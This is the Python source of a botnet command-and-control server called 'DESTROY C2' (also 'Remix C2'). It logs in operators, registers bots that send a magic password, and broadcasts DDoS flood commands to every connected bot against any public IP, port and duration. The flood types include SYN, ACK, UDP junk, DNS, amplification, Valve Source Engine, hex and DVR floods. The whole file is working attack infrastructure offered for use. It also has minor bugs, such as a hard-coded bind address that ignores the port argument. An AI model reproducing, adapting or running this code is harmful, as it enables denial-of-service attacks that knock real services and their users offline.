import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

bots = {}
ansi_clear = '\033[2J\033[H'

banner = ('''
                              \033[94m╔═╦═╦══╦═\033[0m═╦╦╦═╦╦╗\x1b[0m            
                              \033[94m║╠║╦╬╗╚╬╗\033[0m╔╣╔╣║╠╗║\x1b[0m         
                              \033[94m╚═╩═╩══╝╚\033[0m╝╚╝╚═╝╚╝\x1b[0m
                              \033[95mDestroy \033[93mCnC \033[37mSTART\x1b[0m
               \033[94m════════╦═══════════════\033[0m══════════════╦════════\x1b[0m
             \033[94m╔═════════╩═══════════════\033[0m══════════════╩═════════╗\x1b[0m
             \033[94m║       \033[96mWelcom To The \033[91mDESTROY \033[93mC2 BotNet !         \033[0m║\x1b[0m
           \033[94m╔╗╚═════════════════════════\033[0m════════════════════════╝╔╗\x1b[0m
           \033[94m║╚══════════════════════════\033[0m═════════════════════════╝║\x1b[0m
          \033[94m╔╩═══════════════════════════\033[0m══════════════════════════╩╗\x1b[0m
          \033[94m║   \033[93m- - - -  \033[91mDESTROY \033[93mV\033[37m1 By \033[94m[\033[93mTree Ishtar#4632\033[94m] \033[93m- - - -   \033[0m║\x1b[0m
          \033[94m║          \033[96mCopyright © \033[91mDESTROY \033[93m2022 \033[37mC&C Panel.          \033[0m║\x1b[0m
          \033[94m╚════════════════════════════\033[0m═══════════════════════════╝\x1b[0m
        ''')

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 600

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 30

def find_login(username, password):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;Remix C2 | Bots: {len(bots)} | Connected : {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.LIGHTBLUE_EX}Remix C2{Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, 'HELP: Shows list of commands')
                send(client, 'LAYER4: Shows list of attack methods')
                send(client, 'VIP: Shows list of best methods')
                send(client, 'CLEAR: Clears the screen')
                send(client, 'LOGOUT: Disconnects from CnC server')
                send(client, '')

            elif command == 'LAYER4':
                send(client, ansi_clear, False)
                banner2 = ('''

           [38;2;255;442;0m╔════════════════════════════\033[0m════════════════════════════╗
           [38;2;255;442;0m║[38;2;255;442;0m.tcp \033[37m> TCP junk flood                                   \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.syn \033[37m> TCP SYN flood                                    \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.ack \033[37m> TCP ACK flood                                    \033[0m║
           [38;2;255;442;0m╚════╦═══════════════════════\033[0m═══════════════════════╦════╝
           [38;2;255;442;0m╔════╩═══════════════════════\033[0m═══════════════════════╩════╗
           [38;2;255;442;0m║[38;2;255;442;0m.udp \033[37m> UDP junk flood                                   \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.dns \033[37m> UDP DNS flood                                    \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.payload \033[37m> pps flood                                    \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.amp \033[37m> UDP Amplified Protocol                           \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.hex \033[37m> UDP HEX FLOOD                                    \033[0m║
           [38;2;255;442;0m║[38;2;255;442;0m.dvr \033[37m> UDP dvr FLOOD                                    \033[0m║
           [38;2;255;442;0m╚════════════════════════════\033[0m════════════════════════════╝
                ''')
                for x in banner2.split('\n'):
                    send(client, x)
                
            elif command == 'VIP':
                send(client, ansi_clear, False)
                banner3 = ('''

           [38;2;81;15;138m╔════════════════════════════\033[0m════════════════════════════╗
           [38;2;81;15;138m║[38;2;81;15;138m.amp \033[37m> UDP Amplified Protocol                           \033[0m║
           [38;2;81;15;138m║[38;2;81;15;138m.dns \033[37m> UDP DNS flood                                    \033[0m║
           [38;2;81;15;138m║[38;2;81;15;138m.paylad \033[37m> UDP PPS Flood                                 \033[0m║
           [38;2;81;15;138m║[38;2;81;15;138m.hex \033[37m> UDP hex Flood                                    \033[0m║
           [38;2;81;15;138m║[38;2;81;15;138m.dvr \033[37m> UDP dvr Flood                                    \033[0m║    
           [38;2;81;15;138m╚════════════════════════════\033[0m════════════════════════════╝    
                ''')
                for x in banner3.split('\n'):
                    send(client, x)

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'c':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye :)')
                time.sleep(1)
                break
            
            # Valve Source Engine query flood
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')

            # TCP SYNchronize flood           
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
                    
            # TCP junk data packets flood
            elif command == '.TCP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME]')

            # TCP ACK flood
            elif command == '.ACK':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .ACK [IP] [PORT] [TIME]')

            # UDP junk data packets flood
            elif command == '.UDP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')            

            elif command == '.AMP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .amp [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')

            elif command == '.DNS':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .dns [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')

            elif command == '.PAYLOAD':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .payload [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode') 

            # UDP HEX Flood
            elif command == '.HEX':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .HEX [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')          

            # UDP DVR Flood
            elif command == '.dvr':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                    send(client, Fore.GREEN + f'\033[37m[\033[92m+\033[37m] Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-600 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .dvr [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')         
                    
            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;REMIX C2 | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('127.0.0.1', 1312))
    except:
        print('6667')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
